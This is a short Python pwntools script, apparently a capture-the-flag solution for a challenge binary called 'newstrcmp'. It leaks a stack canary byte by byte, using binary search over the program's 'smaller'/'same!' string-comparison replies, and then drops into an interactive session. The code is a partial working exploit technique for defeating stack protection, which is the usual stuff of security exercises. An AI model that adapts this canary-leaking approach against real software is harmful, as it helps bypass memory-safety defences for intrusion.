#!/usr/bin/python3
from pwn import *

context.binary = exe = ELF('./newstrcmp',checksec=False)
p = process()
#gdb.attach(p,gdbscript='''
#           b*0x0000000000401458
#           b*0x0000000000401482
#           b*0x0000000000401310
#           c
#           ''')


input()
p.recvuntil(b'(y/n): ')
low = 1 
high = 255
flag = False
canary = ''
while flag==False:
    while(low<=high):
        print(f"canary: {canary}")
        p.sendline(b'n')
        mid = (low+high) // 2
        payload = 'a'*25 + canary + chr(mid)
        p.recvuntil(b's1: ')
        p.send(payload)
        p.recvuntil(b's2: ')
        p.send('a'*25)
        result = p.recv()
        if b'smaller' in result:
            low = mid + 1
        else:
            high = mid -1
        if b'same!' in result:
            canary += str(chr(mid))
            log.info(f"found: {chr(mid)}")
            log.info(f"canary: {canary}")
        if(len(canary)==7):
            flag = True
            break
print(canary)



    






p.interactive()
